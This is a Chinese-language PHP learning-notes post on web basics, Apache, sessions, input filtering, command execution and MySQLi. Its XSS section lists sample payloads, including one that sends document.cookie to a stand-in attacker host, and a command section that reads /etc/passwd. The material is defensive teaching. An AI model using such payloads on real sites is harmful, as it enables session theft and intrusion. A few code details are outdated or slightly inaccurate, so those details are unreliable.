---
title: PHP开发学习笔记
tags: [PHP, Web开发, Apache, 数据库, 安全, 学习笔记]
date: 2024-03-10
---

# PHP开发学习笔记

本文详细介绍了PHP Web开发的核心知识，包括静态与动态网站、Apache配置、PHP基础语法、数据库操作、安全防护等重要内容，为PHP开发者提供全面的技术指导。

<!-- more -->

## Web基础概念

### 静态网站与动态网站

#### 静态网站

**定义**：保存在服务器上的一个文件，内容固定不变。

**特点**：
- 内容预先编写好，存储在服务器文件系统中
- 用户访问时直接返回文件内容
- 不与数据库交互
- 响应速度快，服务器负载小

#### 动态网站

**定义**：与数据库联系，根据用户操作实时更新内容。

**特点**：
- 内容根据用户请求动态生成
- 常见扩展名：`.php`、`.asp`、`.jsp`等
- 需要服务器端脚本处理
- 可以实现用户交互和个性化内容

### 页面解析流程

#### 静态页面解析流程

1. **DNS解析**：浏览器根据URL使用DNS服务器将域名转换为IP地址
2. **建立连接**：根据IP地址访问服务器
3. **端口定位**：使用端口号找到Apache进程
4. **文件定位**：Apache根据URI找到网页文件夹
5. **内容解析**：Apache解析HTML文件
6. **响应返回**：将解析结果返回给浏览器
7. **页面渲染**：浏览器解析并显示给用户

#### 动态页面解析流程

在静态页面解析基础上，增加了以下步骤：

4. **脚本处理**：Apache将PHP文件交给PHP引擎解析
5. **数据库交互**：PHP引擎可能与数据库进行交互
6. **动态生成**：生成HTML内容
7. **返回结果**：将生成的HTML返回给Apache，再返回给浏览器

**注意**：Apache只能解析HTML内容，所以需要PHP解析引擎来处理PHP代码。

## Apache服务器配置

### 常见文件扩展名和目录

#### 文件扩展名

| 扩展名 | 全称 | 描述 |
|--------|------|------|
| `.bin` | Binary | 二进制文件，Windows下的可执行文件 |
| `.conf` | Configuration | 配置文件 |
| `.dll` | Dynamic Link Library | 动态链接库文件 |

#### 重要目录

| 目录名 | 用途 |
|--------|------|
| `conf` | 配置文件目录 |
| `lib` | 核心文件夹，静态链接库 |
| `htdocs` | Apache默认的主机地址（网络根目录） |
| `modules` | 模块目录，可以加载到conf配置中 |

#### 状态指示

- **绿色**：服务开启成功
- **黄色**：端口被占用

#### 工具

- **ab.exe**：压力测试工具，测试服务器承载能力

### 库文件类型

#### 静态链接库（lib）

**特点**：
- 在编译时将库代码复制到可执行文件中
- 程序运行时不依赖外部库文件
- 文件体积较大
- 更新库需要重新编译程序

#### 动态链接库（dll）

**特点**：
- 程序运行时动态加载
- 多个程序可以共享同一个库文件
- 内存占用更小
- 便于程序更新和维护
- 需要确保库文件存在于系统中

### Apache配置管理

#### 服务管理

**服务名**：`httpd`（HTTP Daemon）

**常用命令**：
```bash
# 查询模块使用情况
httpd.exe -M
# static: 静态加载
# shared: 只有使用时才会加载

# 检查配置文件语法
httpd.exe -t
# 输出"Syntax OK"表示没有语法错误
```

#### 配置文件修改

**主配置文件**：`httpd.conf`

**修改方法**：
- 使用010 Editor等十六进制编辑器
- 或使用普通文本编辑器

**常见配置项**：
```apache
# 服务器名称和端口
ServerName localhost:80

# 监听端口
Listen 80

# 可以修改为其他端口
Listen 8080
```

## PHP基础语法

### 安全函数

#### htmlspecialchars()方法

**定义**：在HTML中，小于号和大于号被用作标签的开始和结束标记，因此不能直接在HTML代码中使用。为了显示这些字符，需要使用实体表示。

**转换规则**：

| 字符 | 实体表示 | 描述 |
|------|----------|------|
| `&` | `&amp;` | 和号 |
| `"` | `&quot;` | 双引号 |
| `'` | `&#039;` | 单引号 |
| `<` | `&lt;` | 小于号 |
| `>` | `&gt;` | 大于号 |

**使用示例**：
```php
<?php
$input = '<script>alert("XSS")</script>';
$safe_input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
echo $safe_input;
// 输出：&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
?>
```

**转换前后对比**：
```html
<!-- 转换前（危险） -->
<form method="post" action="test_form.php/"><script>alert('hacked')</script>">

<!-- 转换后（安全） -->
<form method="post" action="test_form.php/&quot;&gt;&lt;script&gt;alert('hacked')&lt;/script&gt;">
```

#### trim()函数

**功能**：去除用户输入数据中不必要的字符

**可去除的字符**：
- 空格
- 制表符（Tab）
- 换行符
- 回车符

**使用示例**：
```php
<?php
$input = "  Hello World  \n";
$cleaned = trim($input);
echo "'$cleaned'"; // 输出：'Hello World'
?>
```

#### stripslashes()函数

**功能**：去除用户输入数据中的反斜杠

**使用场景**：
- 处理从表单提交的数据
- 清理包含转义字符的字符串

**使用示例**：
```php
<?php
$input = "It\'s a beautiful day";
$cleaned = stripslashes($input);
echo $cleaned; // 输出：It's a beautiful day
?>
```

### XSS攻击防护

#### XSS概念

**定义**：XSS（Cross-Site Script，跨站脚本攻击）是一种代码注入攻击。

**攻击原理**：
- 恶意攻击者往Web页面里插入恶意HTML代码
- 当用户浏览该页面时，嵌入的HTML代码会被执行
- 从而达到恶意用户的特殊目的

#### 常见XSS攻击代码

```javascript
// 页面跳转攻击
<script>location.href('http://malicious-site.com')</script>

// 获取用户Cookie
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// 弹窗攻击
<script>alert('XSS Attack!')</script>
```

#### location.href详解

**功能**：代表当前浏览器窗口中显示的URL地址

**用途**：
- 获取当前页面URL
- 实现页面跳转
- 可能被恶意利用进行钓鱼攻击

**安全使用**：
```javascript
// 安全的页面跳转
if (confirm('确定要跳转到新页面吗？')) {
    location.href = 'https://trusted-site.com';
}
```

## PHP文件处理

### 文件操作函数总结

| 操作 | 函数 | 描述 | 示例 |
|------|------|------|------|
| 打开文件 | `fopen()` | 用于打开文件，指定文件名和打开模式 | `$file = fopen("welcome.txt", "r");` |
| 关闭文件 | `fclose()` | 关闭已打开的文件 | `fclose($file);` |
| 检测文件末尾 | `feof()` | 检测是否已到达文件末尾（EOF） | `if (feof($file)) echo "文件结尾";` |
| 逐行读取 | `fgets()` | 从文件中逐行读取文件内容 | `while(!feof($file)) { echo fgets($file). "<br>"; }` |
| 逐字符读取 | `fgetc()` | 从文件中逐字符地读取文件内容 | `while (!feof($file)) { echo fgetc($file); }` |

### 文件打开模式

| 模式 | 描述 | 读取 | 写入 | 指针位置 | 文件不存在时 |
|------|------|------|------|----------|-------------|
| `r` | 只读 | ✓ | ✗ | 文件开头 | 失败 |
| `r+` | 读写 | ✓ | ✓ | 文件开头 | 失败 |
| `w` | 只写 | ✗ | ✓ | 文件开头（清空） | 创建新文件 |
| `w+` | 读写 | ✓ | ✓ | 文件开头（清空） | 创建新文件 |
| `a` | 追加 | ✗ | ✓ | 文件末尾 | 创建新文件 |
| `a+` | 读/追加 | ✓ | ✓ | 文件末尾 | 创建新文件 |
| `x` | 只写 | ✗ | ✓ | 文件开头 | 创建新文件（文件存在则失败） |
| `x+` | 读/写 | ✓ | ✓ | 文件开头 | 创建新文件（文件存在则失败） |

### 文件操作示例

```php
<?php
// 安全的文件读取示例
$filename = "welcome.txt";
$file = fopen($filename, "r") or exit("无法打开文件!");

while (!feof($file)) {
    echo fgets($file) . "<br>";
}

fclose($file);
?>
```

## 加密与哈希

### MD5函数

**语法**：
```php
string md5(string $string [, bool $raw_output = false])
```

**参数说明**：

| 参数 | 描述 |
|------|------|
| `string` | 必需。规定要计算的字符串 |
| `raw` | 可选。规定十六进制或二进制输出格式 |
|  | `TRUE` - 原始16字符二进制格式 |
|  | `FALSE` - 默认。32字符十六进制数 |

**使用示例**：
```php
<?php
$password = "123456";
$hashed = md5($password);
echo $hashed; // 输出：e10adc3949ba59abbe56e057f20f883e

// 二进制格式
$binary_hash = md5($password, true);
echo bin2hex($binary_hash); // 同样的结果
?>
```

**安全注意事项**：
- MD5已被认为不够安全
- 建议使用`password_hash()`和`password_verify()`
- 对于敏感数据，考虑使用SHA-256或更强的算法

## Cookie和Session

### Cookie详解

#### Cookie基本概念

**定义**：Cookie是一种服务器**留在用户计算机**上的小文件，用于识别用户。

**特点**：
- 存储在客户端浏览器
- 大小限制（通常4KB）
- 可以设置过期时间
- 域名和路径限制

#### Cookie操作

| 操作 | 示例 | 描述 |
|------|------|------|
| 创建Cookie | `setcookie("name", "value", time()+3600);` | 创建一个1小时后过期的Cookie |
| 设置长期Cookie | `setcookie("name", "value", time()+3600*24*30);` | 创建一个30天后过期的Cookie |
| 读取Cookie | `echo $_COOKIE["name"];` | 获取Cookie的值 |
| 检查Cookie存在 | `if (isset($_COOKIE["name"])) { ... }` | 检查Cookie是否存在 |
| 删除Cookie | `setcookie("name", "", time()-3600);` | 通过设置过期时间为过去时间来删除 |

#### Cookie替代方案

当浏览器不支持Cookie时，可以使用表单传递数据：

```html
<!-- 表单提交 -->
<form action="welcome.php" method="post">
    <input type="hidden" name="user_id" value="123">
    <input type="submit" value="提交">
</form>
```

```php
<?php
// 获取表单数据
echo $_POST["user_id"];
?>
```

### Session详解

#### Session基本概念

**定义**：PHP Session用于存储用户会话信息，对所有页面可用，信息临时存储，用户离开后被删除。

**解决的问题**：
- HTTP协议无状态特性
- Web服务器无法识别用户身份
- 无法跟踪用户操作历史

#### Session操作

| 操作 | 示例 | 描述 |
|------|------|------|
| 开始Session | `session_start();` | 启动或恢复会话 |
| 存储Session变量 | `$_SESSION['name'] = 'John';` | 设置会话变量 |
| 检索Session变量 | `echo $_SESSION['name'];` | 获取会话变量 |
| 检查Session变量 | `if (isset($_SESSION['name'])) { ... }` | 检查会话变量是否存在 |
| 增加Session变量值 | `$_SESSION['counter']++;` | 递增计数器 |
| 销毁单个变量 | `unset($_SESSION['name']);` | 删除特定会话变量 |
| 销毁整个Session | `session_destroy();` | 销毁所有会话数据 |

#### Session工作原理

```php
<?php
// 页面1：设置Session
session_start();
$_SESSION['username'] = 'admin';
$_SESSION['login_time'] = time();
echo "Session已设置";
?>

<?php
// 页面2：读取Session
session_start();
if (isset($_SESSION['username'])) {
    echo "欢迎，" . $_SESSION['username'];
    echo "登录时间：" . date('Y-m-d H:i:s', $_SESSION['login_time']);
} else {
    echo "请先登录";
}
?>
```

### Cookie与Session对比

| 特性 | Cookie | Session |
|------|--------|----------|
| **存储位置** | 客户端浏览器 | 服务器端 |
| **安全性** | 较低，可能被篡改 | 较高，存储在服务器 |
| **数据类型** | 字符串 | 对象 |
| **大小限制** | 4KB左右 | 受服务器内存限制 |
| **生命周期** | 可设置长期保存 | 浏览器关闭后失效 |
| **访问路径** | 可设置路径限制 | 同一网站任何地方都可访问 |
| **依赖性** | 独立工作 | 需要Cookie支持（存储Session ID） |
| **网络传输** | 每次请求都传输 | 只传输Session ID |

### Session依赖Cookie的机制

**工作流程**：

1. **Session启动**：服务器调用`session_start()`
2. **生成Session ID**：服务器生成唯一的Session标识符（如PHPSESSID）
3. **Cookie存储ID**：将Session ID存储在客户端Cookie中
4. **数据存储**：Session数据存储在服务器端
5. **后续请求**：浏览器自动发送包含Session ID的Cookie
6. **数据关联**：服务器通过Session ID找到对应的Session数据

**示例**：
```php
<?php
session_start();

// 查看Session ID
echo "Session ID: " . session_id() . "<br>";

// 查看Session保存路径
echo "Session保存路径: " . session_save_path() . "<br>";

// 设置Session数据
$_SESSION['user_data'] = array(
    'id' => 1,
    'username' => 'admin',
    'role' => 'administrator'
);

echo "Session数据已保存";
?>
```

## 错误处理

### 自定义错误处理

#### set_error_handler函数

**功能**：明确地告诉PHP在遇到错误时使用哪个函数来处理

**语法**：
```php
set_error_handler($error_handler, $error_types)
```

**参数说明**：
- `$error_handler`：错误处理函数名
- `$error_types`：要处理的错误类型

#### 完整示例

```php
<?php
// 错误处理函数
function customError($errno, $errstr, $errfile, $errline) {
    echo "<b>Error:</b> [$errno] $errstr<br>";
    echo "错误文件: $errfile<br>";
    echo "错误行号: $errline<br>";
    echo "脚本结束";
    die();
}

// 设置错误处理函数
set_error_handler("customError", E_USER_WARNING);

// 触发错误
$test = 2;
if ($test > 1) {
    trigger_error("变量值必须小于等于 1", E_USER_WARNING);
}
?>
```

#### 错误类型常量

| 常量 | 值 | 描述 |
|------|----|----- |
| `E_ERROR` | 1 | 致命的运行时错误 |
| `E_WARNING` | 2 | 运行时警告 |
| `E_PARSE` | 4 | 编译时语法解析错误 |
| `E_NOTICE` | 8 | 运行时通知 |
| `E_USER_ERROR` | 256 | 用户产生的错误信息 |
| `E_USER_WARNING` | 512 | 用户产生的警告信息 |
| `E_USER_NOTICE` | 1024 | 用户产生的通知信息 |
| `E_ALL` | 32767 | 所有错误和警告 |

### 错误日志记录

#### error_log()函数

**功能**：向指定的文件或远程目的地发送错误记录

**语法**：
```php
bool error_log(string $message [, int $message_type [, string $destination [, string $extra_headers]]])
```

**使用示例**：
```php
<?php
// 记录到系统日志
error_log("这是一个错误信息");

// 记录到指定文件
error_log("这是一个错误信息", 3, "/var/log/php_errors.log");

// 发送邮件
error_log("服务器错误", 1, "admin@example.com");
?>
```

## 异常处理

### 异常处理机制

#### 基本概念

**目的**：避免程序因错误而意外终止，提供优雅的错误处理方式。

**核心组件**：
1. **Try**：包含可能出现异常的代码
2. **Throw**：规定如何触发异常
3. **Catch**：捕获异常并处理

#### 异常处理结构

```php
<?php
try {
    // 可能出现异常的代码
    $result = 10 / 0; // 这会触发异常
    echo "结果：$result";
} catch (Exception $e) {
    // 异常处理代码
    echo "捕获到异常：" . $e->getMessage();
    echo "文件：" . $e->getFile();
    echo "行号：" . $e->getLine();
} finally {
    // 无论是否有异常都会执行
    echo "清理资源";
}
?>
```

#### 自定义异常

```php
<?php
// 自定义异常类
class CustomException extends Exception {
    public function errorMessage() {
        return "错误行号 {$this->getLine()} 在 {$this->getFile()}: {$this->getMessage()}";
    }
}

try {
    $value = -1;
    if ($value < 0) {
        throw new CustomException("值不能为负数");
    }
} catch (CustomException $e) {
    echo $e->errorMessage();
}
?>
```

#### 多重异常处理

```php
<?php
try {
    // 可能抛出不同类型异常的代码
    if ($condition1) {
        throw new InvalidArgumentException("参数无效");
    } elseif ($condition2) {
        throw new RuntimeException("运行时错误");
    }
} catch (InvalidArgumentException $e) {
    echo "参数异常：" . $e->getMessage();
} catch (RuntimeException $e) {
    echo "运行时异常：" . $e->getMessage();
} catch (Exception $e) {
    echo "其他异常：" . $e->getMessage();
}
?>
```

## PHP过滤器

### 过滤器概述

**目的**：验证和过滤来自非安全来源的数据，比如用户输入。

**主要函数**：
- `filter_var()` - 过滤单一变量
- `filter_var_array()` - 过滤多个变量
- `filter_input()` - 获取并过滤输入变量
- `filter_input_array()` - 获取并过滤多个输入变量

### 过滤器类型

#### Validating过滤器（验证）

**特点**：
- 用于验证用户输入
- 严格的格式规则（如URL或Email验证）
- 成功返回预期类型，失败返回FALSE

**示例**：
```php
<?php
$int = 123;

if (!filter_var($int, FILTER_VALIDATE_INT)) {
    echo "不是一个合法的整数";
} else {
    echo "是个合法的整数";
}

// 验证邮箱
$email = "user@example.com";
if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo "邮箱格式正确";
} else {
    echo "邮箱格式错误";
}

// 验证URL
$url = "https://www.example.com";
if (filter_var($url, FILTER_VALIDATE_URL)) {
    echo "URL格式正确";
} else {
    echo "URL格式错误";
}
?>
```

#### Sanitizing过滤器（清理）

**特点**：
- 用于允许或禁止字符串中指定的字符
- 无数据格式规则
- 始终返回字符串

**示例**：
```php
<?php
$string = "<script>alert('XSS')</script>";

// 清理HTML标签
$clean_string = filter_var($string, FILTER_SANITIZE_STRING);
echo $clean_string; // 输出：alert('XSS')

// 清理邮箱
$email = "user@exa//mple.com";
$clean_email = filter_var($email, FILTER_SANITIZE_EMAIL);
echo $clean_email; // 输出：user@example.com
?>
```

### 高级过滤选项

#### 添加过滤选项

```php
<?php
$var = 300;

$int_options = array(
    "options" => array(
        "min_range" => 0,
        "max_range" => 256
    )
);

if (!filter_var($var, FILTER_VALIDATE_INT, $int_options)) {
    echo "不是一个合法的整数（范围：0-256）";
} else {
    echo "是个合法的整数";
}
?>
```

#### 常用过滤器常量

| 过滤器 | 描述 |
|--------|------|
| `FILTER_VALIDATE_INT` | 验证整数 |
| `FILTER_VALIDATE_FLOAT` | 验证浮点数 |
| `FILTER_VALIDATE_EMAIL` | 验证邮箱 |
| `FILTER_VALIDATE_URL` | 验证URL |
| `FILTER_VALIDATE_IP` | 验证IP地址 |
| `FILTER_SANITIZE_STRING` | 清理字符串 |
| `FILTER_SANITIZE_EMAIL` | 清理邮箱 |
| `FILTER_SANITIZE_URL` | 清理URL |
| `FILTER_SANITIZE_NUMBER_INT` | 清理整数 |

## 正则表达式

### preg_match函数

**语法**：
```php
int preg_match(string $pattern, string $subject [, array &$matches [, int $flags = 0 [, int $offset = 0]]])
```

**参数说明**：
- `$pattern`：要搜索的模式（正则表达式）
- `$subject`：输入字符串
- `$matches`：（可选）搜索结果数组
- `$flags`：（可选）标志
- `$offset`：（可选）开始搜索的偏移量

### 安全过滤示例

#### 危险字符过滤

```php
<?php
$ip = $_GET['ip'];

// 检查是否包含危险字符
if (preg_match("/\?ip=|'|\"|\\\\|\(|\)|\[|\]|\{|\}/", $ip, $match)) {
    die("检测到危险字符！");
}

echo "IP地址：" . $ip;
?>
```

**过滤的危险字符**：
- `'` - 单引号
- `"` - 双引号
- `\` - 反斜杠
- `(` `)` - 圆括号
- `[` `]` - 方括号
- `{` `}` - 花括号

#### 控制字符过滤

```php
<?php
$input = $_POST['data'];

// 过滤控制字符
if (preg_match('/[\x{00}-\x{20}]/u', $input)) {
    die("检测到控制字符！");
}

echo "安全的输入：" . $input;
?>
```

**`\x{00}-\x{20}`范围说明**：
- `\x{00}`：NULL字符
- `\x{20}`：空格字符
- 包括：换行符、回车符、制表符等控制字符
- 这些字符通常不是普通文本字符，可能用于攻击

### 常用正则表达式模式

```php
<?php
// 验证邮箱
$email_pattern = '/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/';

// 验证手机号
$phone_pattern = '/^1[3-9]\d{9}$/';

// 验证身份证号
$id_pattern = '/^[1-9]\d{5}(18|19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]$/';

// 验证密码强度（至少8位，包含大小写字母和数字）
$password_pattern = '/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d@$!%*?&]{8,}$/';

// 使用示例
$email = "user@example.com";
if (preg_match($email_pattern, $email)) {
    echo "邮箱格式正确";
} else {
    echo "邮箱格式错误";
}
?>
```

## 命令执行

### 危险函数

#### exec()函数

**功能**：用于执行外部程序

**危险性**：可能被恶意利用执行系统命令

**示例**：
```php
<?php
// 危险用法
exec("whoami"); // 执行系统命令

// 相对安全的用法
$allowed_commands = ['ls', 'pwd', 'date'];
$command = $_GET['cmd'];

if (in_array($command, $allowed_commands)) {
    exec($command, $output);
    print_r($output);
} else {
    echo "不允许的命令";
}
?>
```

#### 反引号执行

**语法**：使用反引号（`）包围命令

**工作原理**：PHP解释器将反引号内的字符串作为系统命令执行

**示例**：
```php
<?php
// 危险用法
$result = `whoami`;
echo $result;

// 等同于
$result = shell_exec("whoami");
echo $result;
?>
```

### Linux命令对比

#### ls命令变体

| 命令 | 功能 | 示例 |
|------|------|------|
| `ls` | 列出当前目录内容 | `ls` |
| `ls /` | 列出根目录内容 | `ls /` |
| `ls -la` | 详细列出（包括隐藏文件） | `ls -la` |
| `ls /home` | 列出指定目录内容 | `ls /home` |

#### cat命令变体

| 命令 | 功能 | 查找位置 |
|------|------|----------|
| `cat flag` | 读取当前目录下的flag文件 | 当前目录 |
| `cat /flag` | 读取根目录下的flag文件 | 根目录 |
| `cat /etc/passwd` | 读取系统用户文件 | /etc目录 |

### 命令连接符

| 连接符 | 功能 | 示例 | 执行条件 |
|--------|------|------|----------|
| `;` | 顺序执行 | `cmd1; cmd2` | 都执行，无论前面成功与否 |
| `|` | 管道 | `cmd1 | cmd2` | cmd1的输出作为cmd2的输入 |
| `||` | 或运算 | `cmd1 || cmd2` | cmd1失败时执行cmd2 |
| `&` | 后台执行 | `cmd1 & cmd2` | cmd1后台执行，同时执行cmd2 |
| `&&` | 与运算 | `cmd1 && cmd2` | cmd1成功时才执行cmd2 |

**安全示例**：
```php
<?php
// 危险：直接执行用户输入
$cmd = $_GET['cmd'];
exec($cmd); // 非常危险！

// 安全：命令白名单
$safe_commands = [
    'date' => 'date',
    'uptime' => 'uptime',
    'whoami' => 'whoami'
];

$cmd = $_GET['cmd'];
if (isset($safe_commands[$cmd])) {
    exec($safe_commands[$cmd], $output);
    echo implode("\n", $output);
} else {
    echo "命令不被允许";
}
?>
```

## 数据库操作（MySQLi）

### MySQLi扩展概述

**定义**：`mysqli`是MySQL Improved的缩写，是一个面向对象的扩展。

**优势**：
- 支持预处理语句
- 增强的调试功能
- 嵌入式服务器支持
- 强大的功能

### 连接与配置方法

| 方法 | 功能 | 示例 |
|------|------|------|
| `__construct()`/`mysqli()` | 创建新的数据库连接 | `$conn = new mysqli($host, $user, $pass, $db);` |
| `real_connect()` | 建立数据库连接 | `$conn->real_connect($host, $user, $pass, $db);` |
| `options()` | 设置连接选项 | `$conn->options(MYSQLI_OPT_CONNECT_TIMEOUT, 10);` |
| `ping()` | 检查连接是否活动 | `if ($conn->ping()) echo "连接正常";` |
| `close()` | 关闭数据库连接 | `$conn->close();` |
| `select_db()` | 更改默认数据库 | `$conn->select_db("new_database");` |

### 查询执行方法

| 方法 | 功能 | 示例 |
|------|------|------|
| `query()` | 执行SQL查询 | `$result = $conn->query("SELECT * FROM users");` |
| `multi_query()` | 执行多个SQL查询 | `$conn->multi_query("SELECT 1; SELECT 2;");` |
| `real_query()` | 执行SQL查询并返回结果代码 | `$conn->real_query("SELECT * FROM users");` |
| `store_result()` | 获取查询结果集（缓存） | `$result = $conn->store_result();` |
| `use_result()` | 获取查询结果集（非缓存） | `$result = $conn->use_result();` |

### 结果集操作方法

| 方法 | 功能 | 示例 |
|------|------|------|
| `num_rows()` | 获取结果集中的行数 | `echo $result->num_rows;` |
| `field_count()` | 获取查询结果列数 | `echo $conn->field_count;` |
| `fetch_array()` | 获取一行作为关联数组或数字数组 | `$row = $result->fetch_array();` |
| `fetch_assoc()` | 获取一行作为关联数组 | `$row = $result->fetch_assoc();` |
| `fetch_row()` | 获取一行作为数字索引数组 | `$row = $result->fetch_row();` |
| `fetch_object()` | 获取一行作为对象 | `$obj = $result->fetch_object();` |
| `data_seek()` | 移动结果集内部指针到指定行 | `$result->data_seek(5);` |
| `free_result()` | 释放结果集内存 | `$result->free_result();` |

### 错误处理方法

| 方法 | 功能 | 示例 |
|------|------|------|
| `errno()` | 获取上一个操作的错误代码 | `echo $conn->errno;` |
| `error()` | 获取上一个操作的错误信息 | `echo $conn->error;` |
| `sqlstate()` | 获取上一个操作的SQLSTATE错误代码 | `echo $conn->sqlstate;` |

### MySQLi对象属性

| 属性 | 功能 | 示例 |
|------|------|------|
| `connect_error` | 连接失败时的错误描述 | `echo $conn->connect_error;` |
| `connect_errno` | 连接失败时的错误代码 | `echo $conn->connect_errno;` |
| `host_info` | MySQL服务器主机信息 | `echo $conn->host_info;` |
| `server_info` | MySQL服务器版本信息 | `echo $conn->server_info;` |
| `protocol_version` | 通信协议版本 | `echo $conn->protocol_version;` |
| `server_version` | 服务器版本（数字形式） | `echo $conn->server_version;` |
| `client_version` | 客户端库版本 | `echo $conn->client_version;` |
| `client_info` | 客户端库信息 | `echo $conn->client_info;` |
| `stat` | 当前系统状态信息 | `echo $conn->stat;` |
| `sqlstate` | 上一个操作的SQLSTATE错误代码 | `echo $conn->sqlstate;` |

### 预处理语句

#### 预处理语句的优势

1. **性能提升**：用于执行多个相同的SQL语句，执行效率更高
2. **安全性**：防止SQL注入攻击
3. **代码清晰**：分离SQL逻辑和数据

#### 预处理语句使用流程

```php
<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "test";

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname);

// 检查连接
if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}

// 预处理及绑定
$stmt = $conn->prepare("INSERT INTO users (firstname, lastname, email) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $firstname, $lastname, $email);

// 设置参数并执行
$firstname = "John";
$lastname = "Doe";
$email = "john@example.com";
$stmt->execute();

$firstname = "Jane";
$lastname = "Smith";
$email = "jane@example.com";
$stmt->execute();

echo "新记录插入成功";

$stmt->close();
$conn->close();
?>
```

#### bind_param参数类型

| 类型标识 | 数据类型 | 描述 |
|----------|----------|------|
| `i` | integer | 整数 |
| `d` | double | 双精度浮点数 |
| `s` | string | 字符串 |
| `b` | blob | 二进制大对象 |

**使用示例**：
```php
<?php
// 混合类型参数
$stmt = $conn->prepare("INSERT INTO products (name, price, quantity, description) VALUES (?, ?, ?, ?)");
$stmt->bind_param("sdis", $name, $price, $quantity, $description);

$name = "笔记本电脑";
$price = 5999.99;
$quantity = 10;
$description = "高性能笔记本电脑";

$stmt->execute();
?>
```

### 多查询执行

#### mysqli_multi_query()函数

**功能**：可用来执行多条SQL语句

**使用示例**：
```php
<?php
$multi_sql = "
    INSERT INTO users (name, email) VALUES ('User1', 'user1@example.com');
    INSERT INTO users (name, email) VALUES ('User2', 'user2@example.com');
    SELECT * FROM users WHERE name LIKE 'User%';
";

if ($conn->multi_query($multi_sql)) {
    do {
        // 获取第一个结果集
        if ($result = $conn->store_result()) {
            while ($row = $result->fetch_row()) {
                printf("%s (%s)\n", $row[0], $row[1]);
            }
            $result->free();
        }
        
        // 检查是否有更多结果
        if ($conn->more_results()) {
            echo "-----\n";
        }
    } while ($conn->next_result());
}

$conn->close();
?>
```

### 完整的数据库操作示例

```php
<?php
class DatabaseManager {
    private $conn;
    
    public function __construct($host, $username, $password, $database) {
        $this->conn = new mysqli($host, $username, $password, $database);
        
        if ($this->conn->connect_error) {
            die("连接失败: " . $this->conn->connect_error);
        }
        
        // 设置字符集
        $this->conn->set_charset("utf8");
    }
    
    // 安全的查询方法
    public function selectUser($id) {
        $stmt = $this->conn->prepare("SELECT id, name, email FROM users WHERE id = ?");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        
        $result = $stmt->get_result();
        $user = $result->fetch_assoc();
        
        $stmt->close();
        return $user;
    }
    
    // 安全的插入方法
    public function insertUser($name, $email, $password) {
        $hashed_password = password_hash($password, PASSWORD_DEFAULT);
        
        $stmt = $this->conn->prepare("INSERT INTO users (name, email, password) VALUES (?, ?, ?)");
        $stmt->bind_param("sss", $name, $email, $hashed_password);
        
        $success = $stmt->execute();
        $insert_id = $this->conn->insert_id;
        
        $stmt->close();
        return $success ? $insert_id : false;
    }
    
    // 安全的更新方法
    public function updateUser($id, $name, $email) {
        $stmt = $this->conn->prepare("UPDATE users SET name = ?, email = ? WHERE id = ?");
        $stmt->bind_param("ssi", $name, $email, $id);
        
        $success = $stmt->execute();
        $affected_rows = $this->conn->affected_rows;
        
        $stmt->close();
        return $affected_rows > 0;
    }
    
    // 安全的删除方法
    public function deleteUser($id) {
        $stmt = $this->conn->prepare("DELETE FROM users WHERE id = ?");
        $stmt->bind_param("i", $id);
        
        $success = $stmt->execute();
        $affected_rows = $this->conn->affected_rows;
        
        $stmt->close();
        return $affected_rows > 0;
    }
    
    public function close() {
        $this->conn->close();
    }
}

// 使用示例
$db = new DatabaseManager("localhost", "root", "", "test");

// 插入用户
$user_id = $db->insertUser("张三", "zhangsan@example.com", "password123");
if ($user_id) {
    echo "用户创建成功，ID: $user_id\n";
}

// 查询用户
$user = $db->selectUser($user_id);
if ($user) {
    echo "用户信息: " . json_encode($user) . "\n";
}

// 更新用户
if ($db->updateUser($user_id, "张三丰", "zhangsanfeng@example.com")) {
    echo "用户更新成功\n";
}

// 删除用户
if ($db->deleteUser($user_id)) {
    echo "用户删除成功\n";
}

$db->close();
?>
```

## PHP魔术方法

### 常用魔术方法总览

| 魔术方法 | 触发时机 | 用途 |
|----------|----------|------|
| `__construct()` | 对象被创建时 | 构造函数，初始化对象 |
| `__destruct()` | 对象被销毁时 | 析构函数，清理资源 |
| `__call()` | 调用不可访问的方法时 | 方法重载 |
| `__callStatic()` | 静态调用不可访问的方法时 | 静态方法重载 |
| `__get()` | 读取不可访问属性时 | 属性读取重载 |
| `__set()` | 给不可访问属性赋值时 | 属性设置重载 |
| `__isset()` | 对不可访问属性调用isset()或empty()时 | 属性存在性检查 |
| `__unset()` | 对不可访问属性调用unset()时 | 属性删除 |
| `__sleep()` | serialize()函数执行之前 | 序列化前的清理 |
| `__wakeup()` | unserialize()函数执行之前 | 反序列化后的恢复 |
| `__toString()` | 对象被当作字符串使用时 | 字符串转换 |
| `__invoke()` | 对象被当作函数调用时 | 函数调用重载 |

### 重要魔术方法详解

#### __construct()和__destruct()

```php
<?php
class User {
    private $name;
    private $file_handle;
    
    public function __construct($name) {
        $this->name = $name;
        $this->file_handle = fopen("user_log.txt", "a");
        echo "用户 {$this->name} 已创建\n";
    }
    
    public function __destruct() {
        if ($this->file_handle) {
            fclose($this->file_handle);
        }
        echo "用户 {$this->name} 已销毁\n";
    }
}

$user = new User("张三");
// 脚本结束时自动调用__destruct()
?>
```

#### __toString()

```php
<?php
class Product {
    private $name;
    private $price;
    
    public function __construct($name, $price) {
        $this->name = $name;
        $this->price = $price;
    }
    
    public function __toString() {
        return "产品: {$this->name}, 价格: ¥{$this->price}";
    }
}

$product = new Product("笔记本电脑", 5999);
echo $product; // 自动调用__toString()

// 其他触发__toString()的情况
if (file_exists($product)) { // 也会触发__toString()
    echo "文件存在";
}
?>
```

#### __invoke()

```php
<?php
class Calculator {
    public function __invoke($a, $b, $operation = '+') {
        switch ($operation) {
            case '+':
                return $a + $b;
            case '-':
                return $a - $b;
            case '*':
                return $a * $b;
            case '/':
                return $b != 0 ? $a / $b : "除数不能为零";
            default:
                return "不支持的运算";
        }
    }
}

$calc = new Calculator();
echo $calc(10, 5, '+'); // 输出：15
